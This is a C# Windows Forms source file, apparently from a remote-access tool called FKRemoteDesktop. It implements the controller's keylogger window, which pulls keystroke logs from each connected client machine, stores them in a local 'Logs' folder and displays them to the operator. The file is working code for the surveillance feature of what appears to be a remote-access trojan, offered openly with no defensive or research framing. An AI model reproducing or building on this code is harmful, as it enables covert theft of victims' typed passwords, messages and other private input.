using FKRemoteDesktop.Helpers;
using FKRemoteDesktop.Message;
using FKRemoteDesktop.Message.SubMessageHandler;
using FKRemoteDesktop.Network;
using System;
using System.Collections.Generic;
using System.IO;
using System.Windows.Forms;
//--------------------------------------------------------------------------------------
namespace FKRemoteDesktop.Forms
{
    public partial class KeyloggerForm : Form
    {
        private readonly Client _connectClient;
        private readonly KeyloggerHandler _keyloggerHandler;
        private readonly string _baseDownloadPath;
        private static readonly Dictionary<Client, KeyloggerForm> OpenedForms = new Dictionary<Client, KeyloggerForm>();

        public KeyloggerForm(Client client)
        {
            _connectClient = client;
            _keyloggerHandler = new KeyloggerHandler(client);

            _baseDownloadPath = Path.Combine(_connectClient.UserInfo.DownloadDirectory, "Logs\\");

            RegisterMessageHandler();
            InitializeComponent();
        }

        public static KeyloggerForm CreateNewOrGetExisting(Client client)
        {
            if (OpenedForms.ContainsKey(client))
            {
                return OpenedForms[client];
            }
            KeyloggerForm f = new KeyloggerForm(client);
            f.Disposed += (sender, args) => OpenedForms.Remove(client);
            OpenedForms.Add(client, f);
            return f;
        }

        private void RegisterMessageHandler()
        {
            _connectClient.ClientState += ClientDisconnected;
            _keyloggerHandler.ProgressChanged += LogsChanged;
            MessageHandler.Register(_keyloggerHandler);
        }

        private void UnregisterMessageHandler()
        {
            MessageHandler.Unregister(_keyloggerHandler);
            _keyloggerHandler.ProgressChanged -= LogsChanged;
            _connectClient.ClientState -= ClientDisconnected;
        }

        private void ClientDisconnected(Client client, bool connected)
        {
            if (!connected)
            {
                this.Invoke((MethodInvoker)this.Close);
            }
        }

        private void LogsChanged(object sender, string message)
        {
            RefreshLogsDirectory();
            btnGetLogs.Enabled = true;
            stripLblStatus.Text = "状态：" + message;
        }

        private void btnGetLogs_Click(object sender, EventArgs e)
        {
            btnGetLogs.Enabled = false;
            stripLblStatus.Text = "状态：正在接收按键日志...";
            _keyloggerHandler.RetrieveLogs();
        }

        private void KeyloggerForm_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("FK远控服务器端 - 按键日志工具", _connectClient);
            if (!Directory.Exists(_baseDownloadPath))
            {
                Directory.CreateDirectory(_baseDownloadPath);
                return;
            }
            RefreshLogsDirectory();
        }

        private void KeyloggerForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            UnregisterMessageHandler();
            _keyloggerHandler.Dispose();
        }

        private void RefreshLogsDirectory()
        {
            lstLogs.Items.Clear();
            DirectoryInfo dicInfo = new DirectoryInfo(_baseDownloadPath);
            FileInfo[] iFiles = dicInfo.GetFiles();
            foreach (FileInfo file in iFiles)
            {
                lstLogs.Items.Add(new ListViewItem { Text = file.Name });
            }
        }

        private void lstLogs_ItemActivate(object sender, EventArgs e)
        {
            if (lstLogs.SelectedItems.Count > 0)
            {
                wLogViewer.Navigate(Path.Combine(_baseDownloadPath, lstLogs.SelectedItems[0].Text));
            }
        }
    }
}
